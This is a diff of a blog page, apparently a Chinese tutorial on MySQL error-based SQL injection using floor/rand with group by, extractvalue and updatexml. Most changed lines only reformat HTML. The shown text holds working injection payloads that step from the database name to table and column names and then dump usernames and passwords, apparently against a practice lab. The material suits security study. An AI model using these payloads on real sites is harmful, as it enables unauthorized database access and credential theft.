@@ -222,36 +222,36 @@
 <p>利用select count(<em>),floor(rand(0)</em>2)x from
 information_schema.character_sets group by
 x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)<em>2)函数，实现将注入结果与报错信息回显的注入方式。
-</em> rand()函数<br />
-rand()可以产生一个在0和1之间的随机数<br />
+</em> rand()函数<br>
+rand()可以产生一个在0和1之间的随机数<br>
 直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。
-* floor (rand(0)<em>2)函数<br />
-floor函数的作用就是返回小于等于括号内该值的最大整数。<br />
-rand()本身是返回0~1的随机数，但在后面</em>2就变成了返回0~2之间的随机数。<br />
-配合上floor函数就可以产生确定的两个数，即0和1。<br />
+* floor (rand(0)<em>2)函数<br>
+floor函数的作用就是返回小于等于括号内该值的最大整数。<br>
+rand()本身是返回0~1的随机数，但在后面</em>2就变成了返回0~2之间的随机数。<br>
+配合上floor函数就可以产生确定的两个数，即0和1。<br>
 并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。 * group by
-函数<br />
-group by 函数，作用就是分类汇总<br />
-在id 和 name后分别放入a x，意思就是id显示为a name显示为x<br />
+函数<br>
+group by 函数，作用就是分类汇总<br>
+在id 和 name后分别放入a x，意思就是id显示为a name显示为x<br>
 然后使用group by 函数进行分组，并且按照x（name）进行排序。 *
-count(<em>)函数<br />
-count（</em>）函数作用为统计结果的记录数 * 综合使用产生报错<br />
-<code>select count(*),floor(rand(0)*2) x from czs group by x;</code><br />
+count(<em>)函数<br>
+count（</em>）函数作用为统计结果的记录数 * 综合使用产生报错<br>
+<code>select count(*),floor(rand(0)*2) x from czs group by x;</code><br>
 当count（<em>）和group by x同时执行时，就会爆出duplicate entry错误。
-</em> 报错原因解析<br />
+</em> 报错原因解析<br>
 通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by
 语句报错的原因是 floor(random(0)<em>2)的不确定性，即可能为 0 也可能为
-1<br />
+1<br>
 group by key
 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，
 如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand
 值）；如果 该 key 不存在于临时表中，则在临时表中插入 key
-所在行的数据。（插入数据时，会再计算 rand 值）<br />
+所在行的数据。（插入数据时，会再计算 rand 值）<br>
 如果此时临时表只有 key 为 1 的行不存在 key 为 0
 的行，那么数据库要将该条记录插入临
 时表，由于是随机数，插时又要计算一下随机值，此时
 floor(random(0)</em>2)结果可能为 1，就
-会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值<br />
+会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值<br>
 实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3
 行一定会报错，2 行 时是不报错的。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
@@ -283,7 +283,7 @@ syntax）</li>
 <li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
 </ul>
 </blockquote>
-<p><code>?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+</code><br />
+<p><code>?id=1' and extractvalue(1,concat('^',(select database()),'^')) --+</code><br>
 获取数据库名字</p>
 <h2 id="updatexml-函数">3. updatexml() 函数</h2>
 <blockquote>
@@ -300,8 +300,7 @@ syntax）</li>
 <ul>
 <li>语法： updatexml（XML_document，XPath_string，new_value）
 第一个参数：是string格式，为XML文档对象的名称，文中为Doc
-第二个参数：代表路径，Xpath格式的字符串例如//title【<span
-class="citation" data-cites="lang">@lang</span>】
+第二个参数：代表路径，Xpath格式的字符串例如//title【<span class="citation" data-cites="lang">@lang</span>】
 第三个参数：string格式，替换查找到的符合条件的数据</li>
 </ul>
 </blockquote>
@@ -336,29 +335,29 @@ syntax）</li>
 </blockquote>
 <blockquote>
 <p>如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括
-length 个字符（取决于 string 的长度）。<br />
+length 个字符（取决于 string 的长度）。<br>
 如果提供了负数的 length，那么 string 末尾处的 length
 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。如果 offset
-不在这段文本中，那么将返回空字符串。<br />
-如果提供了值为 0 的 length，那么将返回一个空字符串。<br />
+不在这段文本中，那么将返回空字符串。<br>
+如果提供了值为 0 的 length，那么将返回一个空字符串。<br>
 如果没有提供 length，返回的子字符串将从 offset
 位置开始直到字符串结尾。</p>
 </blockquote>
 <p><code>and updatexml(1,concat('^',(需要查询的内容),'^'),1)</code> ###
-1. 提交如下，获取数据库名字<br />
+1. 提交如下，获取数据库名字<br>
 <code>?id=1' and updatexml(1,concat('^',(database()),'^'),1) --+</code></p>
 <h3 id="获取当前数据库中表的名字">2. 获取当前数据库中表的名字</h3>
-<p><del><code>?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+</code><br />
+<p><del><code>?id=1' and updatexml(1,concat('^',(select table_name from information_schema.tables where table_schema='security' ),'^'),1) --+</code><br>
 这里是说要显示的内容超过一行它不能显示那么多，所以在
 table_schema='security' 后加上 limit
 0,1，显示第一行（显示第0行的往下一行，不包括第0行）
-如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users</del><br />
+如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users</del><br>
 使用<code>?id=1'and updatexml(1,substr(concat('^',(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),'^'),1,32),3) --+</code>可有效解决长度显示问题
 ### 3. 爆表中的字段
-<code>?id=1' and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1 ),'^'),1) --+</code><br />
+<code>?id=1' and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1 ),'^'),1) --+</code><br>
 总共爆出的字段为： id , username , password</p>
 <h3 id="爆字段中的内容">4. 爆字段中的内容</h3>
-<p><code>?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1) --+</code><br />
+<p><code>?id=1' and updatexml(1,concat('^',(select group_concat(username,"--",password) from users limit 0,1 ),'^'),1) --+</code><br>
 三组用户名和密码。</p>
 
     </div>
@@ -459,7 +458,7 @@ table_schema='security' 后加上 limit
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -472,7 +471,7 @@ table_schema='security' 后加上 limit
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
